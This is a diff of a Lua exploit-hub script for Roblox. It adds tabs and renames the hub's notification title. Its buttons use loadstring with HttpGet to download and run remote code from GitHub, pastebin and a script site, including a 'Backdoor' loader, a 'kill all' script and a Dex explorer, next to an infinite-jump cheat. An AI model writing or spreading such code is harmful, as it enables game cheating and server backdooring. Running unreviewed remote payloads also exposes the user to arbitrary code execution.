@@ -43,6 +43,8 @@ local Window = Rayfield:CreateWindow({
 
  local PlayerTab = Window:CreateTab("Player", 4483362458)
  local AdminTab = Window:CreateTab("Admin", 4483362458)
+ local scriptTab = Window:CreateTab("script", 4483362458)
+ local GameTab = Window:CreateTab("Game", 4483362458)
 
 
  local Slider = PlayerTab:CreateSlider({
@@ -67,7 +69,7 @@ local Window = Rayfield:CreateWindow({
             _G.infinJumpStarted = true
             
             --Notifies readiness
-            game.StarterGui:SetCore("SendNotification", {Title="UE Hub"; Text="Infinite Jump Activated!"; Duration=5;})
+            game.StarterGui:SetCore("SendNotification", {Title="Youtube Hub"; Text="Infinite Jump Activated!"; Duration=5;})
         
             --The actual infinite jump
             local plr = game:GetService('Players').LocalPlayer
@@ -117,16 +119,30 @@ local Window = Rayfield:CreateWindow({
     end,
  })
 
- local Button = AdminTab:CreateButton({
+ local Button = scriptTab:CreateButton({
     Name = "Dex",
     Callback = function()
         loadstring(game:HttpGet("https://cdn.wearedevs.net/scripts/Dex%20Explorer.txt"))()
     end,
  })
 
- local Button = AdminTab:CreateButton({
+ local Button = scriptTab:CreateButton({
     Name = "Backdoor",
     Callback = function()
       loadstring(game:HttpGet("https://raw.githubusercontent.com/iK4oS/backdoor.exe/master/source.lua"))()
+    end,
+ })
+
+ local Button = scriptTab:CreateButton({
+    Name = "짭부대 킬올",
+    Callback = function()
+        loadstring(game:HttpGet('https://pastebin.com/raw/hcuVUteB'))()
+    end,
+ })
+
+ local Button = GameTab:CreateButton({
+    Name = "백날 땅파봐라 돈이 나오냐?",
+    Callback = function()
+        loadstring(game:HttpGet('https://raw.githubusercontent.com/userbo/Bakddangdon1/main/script'))()
     end,
  })
